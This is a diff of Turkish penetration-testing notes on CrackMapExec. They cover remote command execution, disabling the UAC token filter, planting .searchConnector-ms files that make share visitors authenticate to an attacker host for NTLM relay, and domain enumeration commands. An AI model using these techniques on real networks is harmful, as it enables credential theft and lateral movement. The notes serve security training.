+Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
 
 
+### Administrator Olarak Komut Yürütme
 
-### Command Execution as Administrator
-Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
 
 
 ### Bir Komutu Administrator Olarak Çalıştırma
-![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
-![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+{{CODE_BLOCK_149}}
 
 
-### RID 500 Dışı Hesap Olarak Komut Yürütme
-Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+### RID 500 Olmayan Hesap Olarak Komut Yürütme
+
+Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:
 
 ### Komutu localadmin olarak çalıştırma
-![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
 
-Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+{{CODE_BLOCK_150}}
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.
 
 
 ### LocalAccountTokenFilterPolicy'yi Değiştirme
-![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
 
-![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+{{CODE_BLOCK_151}}
+
+
+{{CODE_BLOCK_152}}
 
 
 ### Domain Hesabı Olarak Komut Yürütme
-LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
 
 
 ### Komutu Robert olarak çalıştır
-![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+{{CODE_BLOCK_153}}
 
 
 ### SMB ile Komut Yürütme
-CME'nin dört (4) farklı komut yürütme yöntemi vardır:
-![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
 
-Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+
+| Komut   | Açıklama                                                                                                                             |
+| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
+| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
+| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
+| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |
+
+Not: Her yöntem her bilgisayarda çalışmayabilir.
 
 Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
 
-![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec
 
-CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
 
 
 ### SMBExec Yöntemi ile Komut Yürütme
-![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+{{CODE_BLOCK_154}}
 
 Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
 
-
 ### wmiexec aracılığıyla PowerShell Komut Yürütme
-![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
-![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+{{CODE_BLOCK_155}}
+
 
 PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
 
@@ -6825,235 +7586,261 @@ Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP
 {{CODE_BLOCK_121}}
 
 ### drop-sc Modülü ile Hash'lerin Çalınması
-Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
 
-Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.
 
-CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.
+
+CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.
 
 İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
 
-* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır
 
-* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.
 
-* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
 
 Drop-sc'yi iş başında görelim:
 
-
 ### Dropping a searchConnector-ms File
 
-![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+{{CODE_BLOCK_122}}
 
-![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+{{CODE_BLOCK_123}}
 
-Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.
 
+### NTLMRelayx ve drop-sc Kullanarak Yönlendirme
 
-### NTLMRelayx ve drop-sc Kullanarak Aktarma
+{{CODE_BLOCK_124}}
 
-![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
-![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
-
-Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:
 
 
 ### searchConnector-ms Dosyalarını Temizleme
-![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
-![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
 
-LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+{{CODE_BLOCK_125}}
 
 
-### SMB ile Eşleme ve Numaralandırma
+LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.
+
+---
+
+
+### SMB ile Mapping ve Enumeration
 
 CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
 
-![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
-![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+| Komut                                                                 | Açıklama                                                          |
+| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |
 
 Daha önce çalışmamış olanları gözden geçirelim:
 
-### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma
 
-Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.
 
 
 ### Sessions ve loggendon-users seçeneklerini kullanma
-![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
 
-Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+{{CODE_BLOCK_126}}
+
+Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.
 
 
 ### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
-![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
-![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+{{CODE_BLOCK_127}}
+
+Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.
+
 
 
 ### Enumerate Computers
 
 CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
 
-
 ### Domain'deki Bilgisayarları Numaralandırma
-![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+{{CODE_BLOCK_128}}
+
 
 Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
 
 
 ### Enumerate LAPS
 
-Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.
 
-![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
 
-![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+{{CODE_BLOCK_129}}
 
-![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
-
-Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
-
+Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.
 
 ### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
 
-Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
 
 
 ### List Local Users
 
-![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
-![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
-![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
-![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
-![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+{{CODE_BLOCK_130}}
 
-Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.
 
-rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
-
+`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
 
 ### Enumerate Disks
 
-Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.
 
 ### Enumerating Disks
-![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+{{CODE_BLOCK_131}}
 
 
 ### Local ve Domain Gruplarını Numaralandırma
-Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.
 
 ### Enumerating Local Groups
-![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
-![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
 
+{{CODE_BLOCK_132}}
 
 ### Enumerating Domain Groups
-![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
-![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
 
-Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+{{CODE_BLOCK_133}}
+
+
+Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.
 
 
 ### Group **Members**
-![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
 
-Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+{{CODE_BLOCK_134}}
+
+Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
 
 
-### Querying WMI
-[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+### WMI Sorgulama
 
-Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
 
-WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.
 
-Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:
 
 
 ### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
-![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
 
-WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+{{CODE_BLOCK_135}}
 
-Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
 
 
 ### Quering root\WMI Namespace
-![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
-![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
 
-Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+{{CODE_BLOCK_136}}
 
-WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.
+
+
 
 Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
 
+----
+
 
 ### LDAP and RDP Enumeration
-Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır
 
 Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
 
-
 ### LDAP & RDP Commands
+
 LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
-![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
-![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
 
-Henüz çalışmadıklarımızı gözden geçirelim.
+| Komut                                                                          | Açıklama                                                                                           |
+| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
